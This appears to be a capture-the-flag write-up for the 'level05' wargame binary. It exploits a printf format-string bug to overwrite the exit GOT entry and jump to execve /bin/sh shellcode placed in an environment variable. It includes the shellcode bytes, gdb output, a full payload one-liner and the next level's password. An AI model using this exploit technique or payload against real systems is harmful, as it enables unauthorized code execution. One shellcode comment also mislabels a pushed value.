# Level05

## Setup

We find a binary file at the root of the user **`level05`** named *`./level05`*.

```bash
scp -r -P 4242 level05@<vm_ip>:/home/users/level05/level05 .
```

### Hex-Rays

We used the Hex-Rays output on the [Dogbolt website](https://dogbolt.org/).

## Source

	char s[100];
	...
	fgets(s, 100, stdin);
	...
	printf(s);
	...
	exit(0);

Unprotected printf alert ! exit is called after, we will redirect exit to a malicious shellcode

## gdb
	> disas exit
	
	Dump of assembler code for function exit@plt:
	0x08048370 <+0>:	jmp    *0x80497e0
	0x08048376 <+6>:	push   $0x18
	0x0804837b <+11>:	jmp    0x8048330
	End of assembler dump.

We will modify exit got entry address content so that the program jumps into our malicious shell code:

`char sc[] = "\x6a\x0b" // push byte +0xb` \
`"\x58" // pop eax` \
`"\x99" // cdq` \
`"\x52" // push edx` \
`"\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f` \
`"\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f` \
`"\x89\xe3" // mov ebx, esp` \
`"\x31\xc9" // xor ecx, ecx` \
`"\xcd\x80"; // int 0x80`

## bash
	export SHELLCODE=$(python -c "print '\x90'*500 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")

We had a difficult time finding the exact entrypoint to our shell code so we added a nopsled before

## gdb
	> b main
	> r
	> x/200s environ
	...
	0xffffdd40:"SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\..."
	> x/200c 0xffffdd40
	0xffffdd40:	80 'P' 65  'A' 89  'Y' 76  'L' 79  'O' 65  'A' 68  'D' 48  '0'
	0xffffdd48: 53  '5' 61  '=' -112  '\220' -112  '\220' -112  '\220' -112  '\220' -112  '\220' -112  '\220'
	0xffffdd50: -112  '\220' -112  '\220' -112  '\220' -112  '\220' -112  '\220'	-112 '\220'	-112 '\220'	-112 '\220'

Let's take an address inside of our nopsled, 0xffffdd58

Now the issue is that ffffdd58 in decimal is a too big number, but thanks to the `h` printf modifier we will write `dd58` and then `ffff` instead of `ffffdd58` in one go: \
0xffffdd58 - 8 = ffffdd50 (minus 8 because we write our 2 addresses before) \
dd50 = 56656 \
ffff - dd58 = 8879	

## Payload
	> python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%56656c" + "%10$hn" + "%8871c" + "%11$hn"' > /tmp/payload05
	> cat /tmp/payload05 - | ./level05
	> cat /home/users/level06/.pass
	h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq